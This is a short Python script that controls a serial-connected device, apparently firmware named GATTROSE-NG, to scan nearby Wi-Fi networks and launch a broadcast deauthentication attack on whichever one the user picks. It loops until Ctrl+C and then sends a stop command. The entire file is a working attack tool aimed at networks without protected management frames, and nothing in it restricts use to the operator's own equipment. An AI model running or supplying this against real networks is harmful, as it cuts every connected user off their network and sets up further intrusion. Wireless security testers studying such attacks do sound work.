#!/usr/bin/env python3
"""
Test deauth on a non-PMF network
"""
import serial
import time
import sys

PORT = "/dev/ttyUSB0"
BAUD = 115200

STX = 0x02
ETX = 0x03
SEP = 0x1D

def send_cmd(ser, cmd, args=""):
    """Send command with STX/ETX framing"""
    msg = bytes([STX]) + cmd.encode() + bytes([SEP]) + args.encode() + bytes([ETX])
    ser.write(msg)
    print(f"Sent: {cmd}{SEP:02x}{args}")
    time.sleep(0.2)

    # Read response
    if ser.in_waiting:
        resp = ser.read(ser.in_waiting)
        print(f"Response: {resp}")
        return resp
    return None

def main():
    try:
        ser = serial.Serial(PORT, BAUD, timeout=2)
        time.sleep(0.5)

        # Drain any existing data
        if ser.in_waiting:
            ser.read(ser.in_waiting)

        print("=== GATTROSE-NG Deauth Test ===\n")

        # First, scan to get networks
        print("1. Requesting scan...")
        send_cmd(ser, 's')
        time.sleep(4)  # Wait for scan

        # Get network list
        print("\n2. Getting network list...")
        resp = send_cmd(ser, 'l')
        time.sleep(0.5)
        if ser.in_waiting:
            print(ser.read(ser.in_waiting).decode(errors='replace'))

        # Ask user which network to deauth
        print("\n" + "="*40)
        index = input("Enter network index to deauth (or 'q' to quit): ")
        if index.lower() == 'q':
            ser.close()
            return

        # Send deauth command (broadcast - no specific client)
        print(f"\n3. Starting broadcast deauth on network {index}...")
        send_cmd(ser, 'd', index)

        print("\nDeauth started! Press Ctrl+C to stop and clean up.")

        try:
            while True:
                if ser.in_waiting:
                    print(ser.read(ser.in_waiting).decode(errors='replace'), end='')
                time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n\n4. Stopping deauth...")
            send_cmd(ser, 'd', 's')
            print("Stopped.")

        ser.close()

    except serial.SerialException as e:
        print(f"Serial error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
